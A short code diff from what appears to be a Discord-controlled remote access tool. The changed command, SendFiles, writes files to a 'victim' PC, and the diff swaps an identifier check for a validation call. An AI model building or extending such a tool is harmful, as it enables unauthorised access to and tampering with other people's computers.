@@ -20,7 +20,7 @@ class SendFiles(commands.Cog):
         file_name: Name of the file after sending to PC
         file_path: Path to which the file should be saved
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             if '"' in file_path:
